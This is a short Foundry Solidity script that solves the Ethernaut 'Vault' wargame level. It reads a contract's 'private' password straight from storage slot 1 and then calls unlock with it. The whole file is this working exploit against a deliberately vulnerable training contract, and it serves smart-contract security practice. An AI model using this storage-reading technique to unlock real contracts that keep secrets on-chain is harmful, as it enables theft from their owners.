// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.17;

import { console } from "forge-std/console.sol";
import { Script } from "forge-std/Script.sol";
import { IVault } from "ethernaut/08-vault/IVault.sol";

contract VaultScript is Script {
    event VaultPassword(bytes32 password, string passwordAsStr);

    function run() external {
        // Get signer
        string memory mnemonic = vm.envString("MNEMONIC");
        uint256 deployerPrivateKey = vm.deriveKey(mnemonic, 1);
        vm.startBroadcast(deployerPrivateKey);

        // Load contract at address
        address vaultAddr = vm.envAddress("L08_VAULT_ADDRESS");

        // Step 1: get password from slot 1 (`bytes32 private password`)
        bytes32 password = vm.load(vaultAddr, bytes32(uint256(1)));
        string memory passwordAsStr = string(abi.encodePacked(password));
        emit VaultPassword(password, passwordAsStr);

        // Step 2: unlock the vault
        IVault vault = IVault(vaultAddr);
        vault.unlock(password);

        vm.stopBroadcast();
    }
}
